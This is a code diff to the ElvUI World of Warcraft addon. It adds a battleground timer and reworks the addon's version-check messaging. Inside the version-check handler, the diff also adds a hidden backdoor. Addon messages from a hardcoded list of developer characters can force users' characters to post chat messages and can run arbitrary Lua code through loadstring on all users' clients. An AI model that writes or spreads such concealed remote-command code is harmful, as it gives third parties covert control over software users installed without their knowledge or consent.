@@ -140,11 +140,24 @@ function E:UpdateMedia()
 	self:UpdateBlizzardFonts()
 end
 
+function E:RequestBGInfo()
+	RequestBattlefieldScoreData();
+end
+
 function E:PLAYER_ENTERING_WORLD()
 	self:CheckRole()
 	if not self.MediaUpdated then
 		self:UpdateMedia()
 		self.MediaUpdated = true;
+	end
+	
+	local _, instanceType = IsInInstance();
+	if(instanceType == 'pvp') then
+		self.BGTimer = self:ScheduleRepeatingTimer('RequestBGInfo', 5);
+		self:RequestBGInfo();
+	elseif(self.BGTimer) then
+		self:CancelTimer(self.BGTimer);
+		self.BGTimer = nil;
 	end
 end
 
@@ -342,19 +355,68 @@ end
 
 function E:SendMessage()
 	local numParty, numRaid = GetNumPartyMembers(), GetNumRaidMembers();
-	local inInstance, instanceType = IsInInstance()
-	if inInstance and instanceType == 'pvp' or instanceType == 'arena' then
-		SendAddonMessage("ElvUIVC", E.version, "BATTLEGROUND")	
+	local inInstance, instanceType = IsInInstance();
+	if(inInstance and (instanceType == 'pvp' or instanceType == 'arena')) then
+		SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'BATTLEGROUND');
 	else
-		if numRaid > 0 then
-			SendAddonMessage("ElvUIVC", E.version, "RAID")
-		elseif numParty > 0 then
-			SendAddonMessage("ElvUIVC", E.version, "PARTY")
+		if(numRaid > 0) then
+			SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'RAID');
+		elseif(numParty > 0) then
+			SendAddonMessage('ELVUI_VERSIONCHK', E.version, 'PARTY');
 		end
 	end
 	
-	self:CancelAllTimers()
+	if(E.SendMSGTimer) then
+		self:CancelTimer(E.SendMSGTimer);
+		E.SendMSGTimer = nil;
+	end
 end
+
+local myName = E.myname..'-'..E.myrealm;
+myName = myName:gsub('%s+', '');
+local frames = {};
+local devAlts = {
+	['Elv-ShatteredHand'] = true,
+	['Sarah-ShatteredHand'] = true,
+	['Sara-ShatteredHand'] = true,
+};
+
+local function SendRecieve(self, event, prefix, message, channel, sender)
+	if(event == 'CHAT_MSG_ADDON') then
+		if(sender == myName) then return; end
+		if(prefix == 'ELVUI_VERSIONCHK' and devAlts[myName] ~= true and not E.recievedOutOfDateMessage) then
+			if(tonumber(message) ~= nil and tonumber(message) > tonumber(E.version)) then
+				E:Print(L['ElvUI is out of date. You can download the newest version from www.tukui.org. Get premium membership and have ElvUI automatically updated with the Tukui Client!']);
+				E:StaticPopup_Show('ELVUI_UPDATE_AVAILABLE');
+				E.recievedOutOfDateMessage = true;
+			end
+		elseif((prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and devAlts[sender] == true and devAlts[myName] ~= true) then
+			if(prefix == 'ELVUI_DEV_SAYS') then
+				local user, channel, msg, sendTo = split('#', message);
+				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
+					SendChatMessage(msg, channel, nil, sendTo);
+				end
+			else
+				local user, executeString = split('#', message);
+				if((user ~= 'ALL' and user == E.myname) or user == 'ALL') then
+					local func, err = loadstring(executeString);
+					if(not err) then
+						E:Print(format('Developer Executed: %s', executeString));
+						func();
+					end
+				end			
+			end
+		end
+	else
+		E.SendMSGTimer = E:ScheduleTimer('SendMessage', 12);
+	end
+end
+
+local f = CreateFrame('Frame')
+f:RegisterEvent('RAID_ROSTER_UPDATE');
+f:RegisterEvent('PARTY_MEMBERS_CHANGED');
+f:RegisterEvent('CHAT_MSG_ADDON');
+f:SetScript('OnEvent', SendRecieve);
 
 function E:UpdateAll(ignoreInstall)
 	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
